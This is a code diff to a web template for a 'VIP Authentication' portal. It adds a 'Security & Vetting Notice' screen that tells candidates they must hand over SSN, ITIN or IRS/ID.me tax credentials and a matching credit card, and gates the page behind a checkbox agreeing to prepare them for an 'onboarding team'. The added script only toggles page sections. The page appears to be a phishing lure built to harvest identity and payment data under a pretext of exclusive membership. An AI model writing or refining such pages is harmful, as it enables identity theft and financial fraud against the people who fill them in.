@@ -169,7 +169,45 @@
 {% endblock %}
 
 {% block content %}
-<div>
+<!-- Vetting Disclosure Agreement Screen -->
+<div id="kyc-disclosure-section" class="verification-card" style="display: none; max-width: 700px; margin: 40px auto; padding: 45px;">
+    <div style="text-align: center; margin-bottom: 30px;">
+        <div style="display: inline-block; background: rgba(212,175,55,0.08); border: 1px solid rgba(212,175,55,0.3); color: var(--primary); font-size: 0.75rem; font-weight: 800; letter-spacing: 1.5px; text-transform: uppercase; padding: 6px 16px; border-radius: 50px; margin-bottom: 15px;">Mandatory Disclosure</div>
+        <h2 style="font-family: 'Outfit'; font-size: 1.8rem; font-weight: 800; margin: 0 0 10px;">Security & Vetting Notice</h2>
+        <p style="color: var(--text-muted); font-size: 0.9rem; line-height: 1.5;">Please read and acknowledge the following onboarding requirements before starting your concierge verification.</p>
+    </div>
+
+    <div style="background: var(--bg-body); border: 1px solid var(--border-color); border-radius: 12px; padding: 25px; margin-bottom: 30px; line-height: 1.7; font-size: 0.95rem;">
+        <h4 style="color: var(--text-main); font-weight: 700; margin-bottom: 10px; font-size: 1rem; display: flex; align-items: center; gap: 8px;">
+            <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24" style="color: var(--primary);"><path d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path></svg>
+            1. High-Assurance Identity Proofing
+        </h4>
+        <p style="color: var(--text-muted); margin-bottom: 20px; font-size: 0.9rem;">
+            To safeguard our private network from identity theft and fraud, all candidates are required to submit official tax credentials (such as an SSN, ITIN, or IRS/ID.me verification). These government-level standards guarantee authentic identity proofing.
+        </p>
+
+        <h4 style="color: var(--text-main); font-weight: 700; margin-bottom: 10px; font-size: 1rem; display: flex; align-items: center; gap: 8px;">
+            <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24" style="color: var(--primary);"><path d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"></path></svg>
+            2. Secondary Financial Verification
+        </h4>
+        <p style="color: var(--text-muted); margin: 0; font-size: 0.9rem;">
+            As an auxiliary check, you must present a valid credit card matching your registered identity. Credit cards serve as secondary proof of active financial responsibility and backing from an accredited financial institution.
+        </p>
+    </div>
+
+    <label style="display: flex; gap: 12px; align-items: flex-start; cursor: pointer; margin-bottom: 30px; user-select: none;">
+        <input type="checkbox" id="kyc-agree-checkbox" style="margin-top: 4px; accent-color: var(--primary);">
+        <span style="font-size: 0.88rem; color: var(--text-main); line-height: 1.5; font-weight: 600;">
+            I acknowledge that IRS/ID.me tax details and credit card credentials are required for verification and agree to prepare them for the onboarding team.
+        </span>
+    </label>
+
+    <button id="proceed-kyc-btn" class="btn btn-primary" style="width: 100%; padding: 16px; font-weight: 700; font-size: 1rem;" disabled>
+        Acknowledge & Proceed
+    </button>
+</div>
+
+<div id="main-verification-content" style="display: none;">
     <div style="text-align: center; margin-bottom: 40px;">
         <h1 style="font-size: 2.2rem; margin-bottom: 10px;">VIP Authentication</h1>
         <p style="color: var(--text-muted);">Confirm your elite status to unlock full portal access.</p>
@@ -415,5 +453,45 @@
             }
         }
     }
+
+    // KYC disclosure logic
+    document.addEventListener("DOMContentLoaded", function() {
+        const discSection = document.getElementById('kyc-disclosure-section');
+        const mainContent = document.getElementById('main-verification-content');
+        const checkbox = document.getElementById('kyc-agree-checkbox');
+        const btn = document.getElementById('proceed-kyc-btn');
+
+        if (discSection && mainContent && checkbox && btn) {
+            if (localStorage.getItem('kyc_disclosure_accepted') === 'true') {
+                mainContent.style.display = 'block';
+                discSection.style.display = 'none';
+            } else {
+                mainContent.style.display = 'none';
+                discSection.style.display = 'block';
+            }
+
+            checkbox.addEventListener('change', function() {
+                btn.disabled = !checkbox.checked;
+            });
+
+            btn.addEventListener('click', function() {
+                if (checkbox.checked) {
+                    localStorage.setItem('kyc_disclosure_accepted', 'true');
+                    discSection.style.opacity = '0';
+                    discSection.style.transition = 'opacity 0.3s ease';
+                    setTimeout(() => {
+                        discSection.style.display = 'none';
+                        mainContent.style.display = 'block';
+                        mainContent.style.opacity = '0';
+                        mainContent.style.transition = 'opacity 0.3s ease';
+                        setTimeout(() => {
+                            mainContent.style.opacity = '1';
+                        }, 50);
+                    }, 300);
+                }
+            });
+        }
+    });
 </script>
+</div>
 {% endblock %}
